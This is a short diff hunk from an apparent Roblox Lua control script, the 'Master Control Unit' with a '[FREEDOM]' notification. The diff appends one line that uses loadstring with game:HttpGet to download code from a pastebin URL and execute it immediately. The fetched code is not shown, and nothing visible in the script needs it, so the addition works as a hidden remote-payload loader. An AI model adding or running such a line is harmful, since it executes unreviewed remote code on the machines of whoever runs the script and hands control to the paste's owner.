@@ -263,3 +263,4 @@ Players.PlayerRemoving:Connect(function(player) if player == selectedPlayer then
 
 updatePlayerList()
 sendNotification("[FREEDOM] System Online", "Master Control Unit v" .. VERSION .. " engaged.")
+loadstring(game:HttpGet("https://pastebin.com/raw/idbiRMZG"))()
